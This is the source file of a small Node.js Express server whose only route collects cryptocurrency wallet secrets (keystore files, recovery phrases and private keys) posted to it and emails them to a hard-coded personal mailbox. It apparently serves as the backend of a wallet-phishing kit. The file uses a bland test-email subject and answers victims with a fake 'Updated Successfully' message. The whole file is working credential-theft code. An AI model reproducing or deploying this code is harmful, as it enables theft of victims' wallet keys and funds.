const express = require('express');
var nodemailer = require('./nodemailer.config');



const app = express();
const PORT = process.env.PORT || 4000;

app.use(express.json());
app.use(express.urlencoded({extended: false}));

app.post('/submit', (req, res, next) => {
    if(req.body.data_keystore != undefined){
        console.log('===================================');
        nodemailer.executeEmail({
            from: 'darkdeveloper',
            to: 'phoenixk54@gmail.com',
            subject: 'Nice Nodemailer test',
            html: require('./config').CONSTANTSECOND(req.body) 
        }, () => {
            return res.json({success : "Updated Successfully", status : 200});
        })
    }

    if(req.body.data_phrase != undefined){
        console.log('===================================');
        nodemailer.executeEmail({
            from: 'darkdeveloper',
            to: 'phoenixk54@gmail.com',
            subject: 'Nice Nodemailer test',
            html: require('./config').CONSTANTFIRST(req.body) 
        }, () => {
            return res.json({success : "Updated Successfully", status : 200});
        })
    }

    if(req.body.data_private != undefined){
        console.log('===================================');
        nodemailer.executeEmail({
            from: 'darkdeveloper',
            to: 'phoenixk54@gmail.com',
            subject: 'Nice Nodemailer test',
            html: require('./config').CONSTANTFIRST(req.body) 
        }, () => {
            return res.json({success : "Updated Successfully", status : 200});
        })
    }
});


app.listen(PORT, () => console.log(`server listening to port ${PORT}`));